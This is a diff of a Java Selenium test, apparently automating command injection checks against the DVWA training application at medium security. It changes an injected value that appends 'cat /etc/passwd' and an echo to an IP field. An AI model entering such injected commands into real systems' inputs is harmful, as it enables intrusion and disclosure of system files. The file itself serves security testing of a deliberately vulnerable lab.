@@ -34,21 +34,19 @@ package testcase;
 		Thread.sleep(1000);
 
 		SecUtils.assertCMDIvulnerable(driver,ip);// assert IP command
-		SecUtils.assertCMDIechovulnerable(driver,"you have been hacked");//assert echo command
+		//SecUtils.assertCMDIechovulnerable(driver,"you have been hacked");//assert echo command
 		
 		
 		}
 		
 		@Test
 		public void commandInjectionmeduim() throws InterruptedException {
-		driver.findElement(By.linkText("DVWA Security")).click();
-		Select drpCountry = new Select(driver.findElement(By.name("security")));
-		drpCountry.selectByValue("medium");
-		driver.findElement(By.name("seclev_submit")).click();
-		System.out.println(driver.getCurrentUrl());
-		
+			
+		super.security("medium");
+		String injection ="127.0.01 & cat /etc/passwd & echo \"you have been hacked\"";
 		driver.findElement(By.linkText("Command Injection")).click();
-		driver.findElement(By.name("ip")).sendKeys("127.0.01 & whoami & echo \"you have been hacked\" ");
+		WebElement ip =driver.findElement(By.name("ip"));
+		ip.sendKeys(injection);
 		Thread.sleep(1000);
 		driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/p/input[2]")).click();
 		
@@ -57,8 +55,10 @@ package testcase;
 		System.out.println(tag.getText());
 		wait.until(ExpectedConditions.visibilityOf(tag));
 		Thread.sleep(1000);
-		
-		SecUtils.isCMDIPresnets(driver, "hacked");
+		//String expectedResult="akila";
+		//SecUtils.isCMDIPresnets(driver, "hacked");
+		//SecUtils.CMDIetcpasswodVulnerabilty(driver, injection);
+		//SecUtils.CMDIwhoamiVulnerabilty(driver, expectedResult);
 		}
 	}
 	//System.out.println();
